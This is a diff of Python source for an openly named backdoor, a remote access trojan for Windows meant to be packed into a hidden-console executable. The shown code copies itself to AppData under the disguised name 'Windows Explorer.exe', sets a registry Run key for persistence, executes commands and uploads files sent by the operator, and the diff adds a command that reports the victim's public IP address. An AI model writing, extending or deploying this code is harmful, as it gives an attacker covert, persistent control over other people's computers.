@@ -1,6 +1,5 @@
 #pyinstaller.exe backdoor.py --onefile --noconsole -> executable file
 
-
 import socket, json
 import subprocess, os, base64, sys, shutil
 
@@ -18,9 +17,10 @@ class Backdoor:
 
   def become_persistent(self):
     evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+    print(evil_file_location)
     if not os.path.exists(evil_file_location):
       shutil.copyfile(sys.executable, evil_file_location)
-      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+      subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
   def reliable_send(self, data):
     json_data = json.dumps(data)
@@ -64,10 +64,27 @@ class Backdoor:
       file.write(base64.b64decode(content))
       return "[+] Upload successful."
 
+  def get_ip(self, command):
+    try:
+      ips = ""
+      DEVNULL = open(os.devnull, 'wb')
+      num = [0,1,2,3,4,5,6,7,8,9]
+      command = " nslookup myip.opendns.com resolver1.opendns.com"
+      ip_result = str(subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL))
+      ip_result = ip_result.replace("\\r\\n", " ").replace("u", "")
+      ip_list = list(ip_result.split(" "))
+      for element in ip_list:
+        for x in num:
+          if element.startswith(str(x)):
+            ips += "\nIP: " + str(element) + " "
+      return ips 
+    except Exception:
+      return "[-] Error during command execution."
+
   # RECIEVE DATA
   def run(self):
     while True:
-      command = self.realiable_recieve()
+      command = self.realiable_recieve() 
       if command[0] == "exit":
         self.connection.close()
         sys.exit()
@@ -85,6 +102,9 @@ class Backdoor:
           self.reliable_send(command_result.decode("latin1"))
       elif command[0] == "upload" and len(command) > 1:
         command_result = self.write_file(command[1], command[2])
+        self.reliable_send(command_result)
+      elif command[0] == "ip":
+        command_result = self.get_ip(command[0])
         self.reliable_send(command_result)
       else: 
         command_result = self.execute_system_command(command)
